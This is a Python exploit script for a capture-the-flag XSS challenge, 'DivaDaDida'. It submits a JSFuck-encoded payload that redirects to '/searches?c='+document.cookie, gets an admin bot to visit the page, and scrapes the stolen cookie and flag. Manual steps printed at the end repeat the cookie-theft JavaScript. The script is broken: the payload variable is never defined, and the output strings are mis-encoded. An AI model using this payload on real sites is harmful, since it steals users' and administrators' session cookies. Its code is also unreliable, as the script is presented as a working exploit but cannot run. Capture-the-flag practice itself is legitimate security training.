#!/usr/bin/env python3
"""
Local Exploit for DivaDaDida
Run this if you have the challenge running locally
"""

import requests
import re
import time

# Use the URL from the screenshot
BASE_URL = "http://r1.arena.airoverflow.com:65340"

def exploit_local():
    """
    Exploit the local instance
    """
    print("=" * 70)
    print("DivaDaDida Local Exploit")
    print("=" * 70)
    print()
    print(f"[*] Target: {BASE_URL}")
    print()
    
    # Test if server is reachable
    print("[*] Testing connectivity...")
    try:
        test_response = requests.get(BASE_URL, timeout=5)
        print(f"[âœ“] Server is reachable (Status: {test_response.status_code})")
        print()
    except Exception as e:
        print(f"[!] Cannot reach server: {e}")
        print()
        print("POSSIBLE SOLUTIONS:")
        print("1. Update BASE_URL in this script to match your challenge URL")
        print("2. Start local server: cd extracted && npm install && npm start")
        print("3. Check if challenge container is running")
        print("4. Update BASE_URL to the actual challenge URL from Arena")
        return
    
    # JSFuck payload - simplified version
    # This creates: location='/searches?c='+document.cookie
    jsfuck
    
    print(f"[*] Payload length: {len(jsfuck)} characters")
    print()
    
    # Step 1: Submit payload
    print("[*] Step 1: Submitting XSS payload to /search...")
    
    data = {
        'q': 'test',
        '_': jsfuck
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/search",
            data=data,
            allow_redirects=False,
            timeout=10
        )
        
        print(f"[*] Status: {response.status_code}")
        
        if response.status_code in [301, 302, 303, 307, 308]:
            redirect_url = response.headers.get('Location', '')
            print(f"[âœ“] Got redirect: {redirect_url}")
            
            # Get UUID
            if '/search/' in redirect_url:
                uuid = redirect_url.split('/search/')[-1]
                print(f"[âœ“] UUID: {uuid}")
                print()
                
                # Construct full URL
                target_url = f"{BASE_URL}/search/{uuid}"
                print(f"[*] Step 2: Reporting to admin bot...")
                print(f"[*] URL: {target_url}")
                
                report_data = {'url': target_url}
                report_resp = requests.post(f"{BASE_URL}/report", data=report_data, timeout=10)
                
                print(f"[âœ“] Report response: {report_resp.text[:100]}")
                print()
                
                # Wait for bot
                print("[*] Step 3: Waiting for bot execution...")
                for i in range(5, 0, -1):
                    print(f"[*] {i}...", end='\r')
                    time.sleep(1)
                print()
                print()
                
                # Check results
                print("[*] Step 4: Checking for flag...")
                searches_resp = requests.get(f"{BASE_URL}/searches", timeout=10)
                
                # Search for flag
                flag_pattern = r'PCC\{[^}]+\}'
                matches = re.findall(flag_pattern, searches_resp.text)
                
                if matches:
                    print()
                    print("=" * 70)
                    print("ðŸš© FLAG FOUND!")
                    print("=" * 70)
                    for match in set(matches):
                        print(f"   {match}")
                    print("=" * 70)
                else:
                    print("[!] Flag not found in /searches")
                    print("[*] Checking URL parameters...")
                    
                    # Check if cookie is in URL
                    if '?c=' in searches_resp.url:
                        print(f"[*] Cookie data in URL: {searches_resp.url}")
                    
                    print()
                    print(f"[*] Manual check: {BASE_URL}/searches")
                    print(f"[*] Or check: {target_url}")
                    
        else:
            print(f"[!] Unexpected response: {response.status_code}")
            print(f"[!] Body: {response.text[:200]}")
            
    except Exception as e:
        print(f"[!] Error: {e}")
    
    print()
    print("=" * 70)

def print_manual_instructions():
    """Print manual exploitation steps"""
    print()
    print("=" * 70)
    print("MANUAL EXPLOITATION:")
    print("=" * 70)
    print()
    print("If automated exploit doesn't work, try manually:")
    print()
    print("1. Visit: https://jsfuck.com/")
    print("   Input: location='/searches?c='+document.cookie")
    print("   Click 'Encode' and copy output")
    print()
    print("2. Use Burp Suite or browser to POST to /search:")
    print("   q=test")
    print("   _=<YOUR_JSFUCK_PAYLOAD>")
    print()
    print("3. Note the UUID from redirect")
    print()
    print("4. POST to /report:")
    print(f"   url={BASE_URL}/search/<UUID>")
    print()
    print("5. Check /searches for flag")
    print()
    print("=" * 70)

if __name__ == "__main__":
    print()
    print("CONFIGURATION:")
    print(f"Current BASE_URL: {BASE_URL}")
    print()
    print("If this is wrong, edit the script and change BASE_URL")
    print("to match your challenge URL (e.g., the one from Arena)")
    print()
    input("Press Enter to continue or Ctrl+C to abort...")
    print()
    
    exploit_local()
    print_manual_instructions()
